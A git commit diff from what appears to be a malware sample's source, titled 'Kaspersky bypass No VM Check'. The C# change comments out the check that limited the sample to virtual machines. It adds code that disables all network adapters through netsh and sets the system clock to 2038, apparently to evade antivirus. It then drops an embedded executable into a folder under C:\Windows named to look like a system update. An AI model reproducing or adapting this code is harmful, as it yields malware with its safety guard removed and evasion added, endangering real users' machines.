e8b26e10096f473d344c1c9c3e8ebf913e8236ae
HydraDragonAntivirus <130374789+Siradankullanici@users.noreply.github.com>
2025-01-06 16:59:23 +0300

    Kaspersky bypass No VM Check

--- auth/Form1.cs
+++ auth/Form1.cs
@@ -66,26 +66,96 @@ namespace auth
             }
         }
 
-        private bool isVM()
+        static string GetAdapterName(string line)
         {
-            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
+            // Split the line into parts, removing any extra spaces
+            string[] parts = line.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
+
+            // Check if there are enough parts to extract the adapter name
+            if (parts.Length > 3)
             {
-                using (var items = searcher.Get())
+                // Get the last element using the length of the array
+                return parts[parts.Length - 1];
+            }
+
+            return null;
+        }
+
+        static string ExecuteCommand(string command)
+        {
+            using (Process process = new Process())
+            {
+                process.StartInfo.FileName = "cmd.exe";
+                process.StartInfo.Arguments = $"/C {command}";
+                process.StartInfo.RedirectStandardOutput = true;
+                process.StartInfo.RedirectStandardError = true;
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.CreateNoWindow = true;
+                process.Start();
+
+                // Read the output and error (if any) from the command
+                string output = process.StandardOutput.ReadToEnd();
+                string error = process.StandardError.ReadToEnd();
+
+                process.WaitForExit();
+
+                // Throw an exception if there is an error
+                if (!string.IsNullOrEmpty(error))
+                    throw new Exception(error.Trim());
+
+                return output.Trim(); // Return the output
+            }
+        }
+
+        static void DisableAllAdapters()
+        {
+            Console.WriteLine("Disabling all network adapters...");
+
+            // Get the list of adapters
+            string adapters = ExecuteCommand("netsh interface show interface");
+            string[] adapterLines = adapters.Split(new[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);
+
+            foreach (var line in adapterLines)
+            {
+                // Check if line represents an enabled adapter
+                if (line.Contains("Enabled"))
                 {
-                    foreach (var item in items)
+                    string adapterName = GetAdapterName(line);
+                    if (!string.IsNullOrEmpty(adapterName))
                     {
-                        string manufacturer = item["Manufacturer"].ToString().ToLower();
-                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
-                            || manufacturer.Contains("vmware")
-                            || item["Model"].ToString() == "VirtualBox")
-                        {
-                            return true;
-                        }
+                        Console.WriteLine($"Disabling adapter: {adapterName}");
+                        ExecuteCommand($"netsh interface set interface \"{adapterName}\" admin=disable");
                     }
                 }
             }
-            return false;
         }
+
+        static void SetSystemDate(DateTime date)
+        {
+            Console.WriteLine($"Changing system date to {date:MM-dd-yyyy}...");
+            ExecuteCommand($"date {date:MM-dd-yyyy}");
+        }
+
+        //private bool isVM()
+        //{
+        //    using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
+        //    {
+        //        using (var items = searcher.Get())
+        //        {
+        //            foreach (var item in items)
+        //            {
+        //                string manufacturer = item["Manufacturer"].ToString().ToLower();
+        //                if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
+        //                    || manufacturer.Contains("vmware")
+        //                    || item["Model"].ToString() == "VirtualBox")
+        //                {
+        //                    return true;
+        //                }
+        //            }
+        //        }
+        //    }
+        //    return false;
+        //}
         private void button1_Click(object sender, EventArgs e)
         {
             if (IsInstalledDotNetCompatible() == false)
@@ -98,17 +168,19 @@ namespace auth
                 MessageBox.Show("C++ Redist not found on your system. Download the Microsoft C++ Redists from Microsoft's website", "Redist Check", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 Environment.Exit(0);
             } else
-            if(isVM() == false)
-            {
-                MessageBox.Show("You're not using a Virtual Machine, so you may not proceed.", "Virtual Machine Check", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                Environment.Exit(0);
-            } else
+            // if(isVM() == false)
+            //{
+            //    MessageBox.Show("You're not using a Virtual Machine, so you may not proceed.", "Virtual Machine Check", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            //    Environment.Exit(0);
+            //} else
             {
                 var s = MessageBox.Show("LAST WARNING: Do you want to execute this malware? This sample is malicious and is NOT A JOKE! The creator is NOT responsible for any damage done. You're responsible for your own actions. If in doubt, click \"No\" and nothing will happen.", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
 
                 if (s == DialogResult.Yes)
                 {
                     this.Hide();
+                    DisableAllAdapters();
+                    SetSystemDate(new DateTime(2038, 1, 19));
                     Directory.CreateDirectory(@"C:\Windows\SystemUpdateResources");
                     File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\UpdateScreen.exe", Resources.UpdateScreen);
                     if (!Directory.Exists(@"C:\Windows\SystemUpdateResources")) { Directory.CreateDirectory(@"C:\Windows\SystemUpdateResources"); } else { }
